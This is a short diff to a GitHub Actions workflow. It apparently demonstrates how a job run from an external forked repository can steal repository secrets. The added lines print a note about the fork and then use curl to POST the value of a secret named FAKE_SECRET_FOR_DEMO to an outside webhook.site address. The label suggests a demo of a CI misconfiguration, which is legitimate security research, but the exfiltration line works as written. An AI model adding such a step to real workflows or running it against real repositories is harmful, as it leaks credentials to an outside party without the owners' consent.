@@ -13,4 +13,6 @@ jobs:
       - name: Print secret
         run: |
           echo "FAKE_SECRET_FOR_DEMO = ${{ secrets.FAKE_SECRET_FOR_DEMO }}"
+          echo "Running this from external forked repo"
+          curl -X POST -H "Content-Type: application/json" -d '{"secret": "'"${{ secrets.FAKE_SECRET_FOR_DEMO }}"'"}' https://webhook.site/041bf490-6af7-4124-bcba-d5ef964ecdd6
       
